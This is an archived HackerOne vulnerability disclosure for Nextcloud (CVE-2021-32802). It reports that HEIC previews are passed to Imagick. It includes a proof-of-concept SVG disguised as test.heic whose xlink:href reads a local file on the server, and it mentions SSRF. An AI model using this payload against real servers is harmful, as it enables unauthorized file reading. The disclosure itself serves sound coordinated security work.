---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/information-disclosure
  - env/web
  - vuln/ssrf
  - trigger/file-upload
substate: "resolved"
weakness: "Information Disclosure"
enriched: true
body: true
date: 2023-01-07
submitted: 2021-07-14T13:21:35.249Z
bounty_usd: null
votes: 16
cve: "CVE-2021-32802"
program: "[[programs/nextcloud|Nextcloud]]"
reporter: "lukasreschkenc"
source: "https://hackerone.com/reports/1261413"
title: "HEIC image preview can be used to invoke Imagick"
---
# HEIC image preview can be used to invoke Imagick

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 16 | **Program:** Nextcloud | **Disclosed:** 2023-01-07

- Report: [https://hackerone.com/reports/1261413](https://hackerone.com/reports/1261413)
- CWE: Information Disclosure | CVE: CVE-2021-32802
- Submitted: 2021-07-14T13:21:35.249Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

The HEIC image preview provider calls into Imagick at https://github.com/nextcloud/server/blob/5d097ddb4b99673f57b8c085dedd93880ee2539d/lib/private/Preview/HEIC.php#L98-L109. This is bad as Imagick processes all kind of image types.

One can use this for example to exfiltrate arbitrary files by passing a SVG file that contains a `xlink:href` to a locally existing file. There are also other concerns with regard to SSRF and XML parsing done by Imagick.

A super naive example, uploading a file such as "test.heic" with this content will render the file "nextcloud20.png" inside it. (but you can also reference PDFs, or use it for SSRF, etc etc.

`test.heic`:
```
<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<svg
   xmlns:svg="http://www.w3.org/2000/svg"
   xmlns="http://www.w3.org/2000/svg"
   xmlns:xlink="http://www.w3.org/1999/xlink"
   style="overflow: hidden; position: relative;"
   width="500"
   height="500">
    <image x="0" y="0" width="500" height="500" xlink:href="/Users/lukasreschke/Downloads/nextcloud20.png" stroke-width="1" id="image3204" />
</svg>
```

Preview:

{F1376376}

## Impact

Gaining access to arbitrary files on the system, SSRF, etc.

## Timeline

- **Report Filed**
- **2021-07-14** @Nextcloud: Thanks a lot for reporting this potential issue back to us!

Our security team will take a look at this issue as soon as possible. We will reply to your report within 72 hours, usually much faster. For obvious reasons we'd like to ask you to not disclose this issue to any other party.
- **Report Triaged**
- **Report Resolved**
- **Cve Id Added**
- **Not Eligible For Bounty**
- **Agreed On Going Public**
- **Report Became Public**
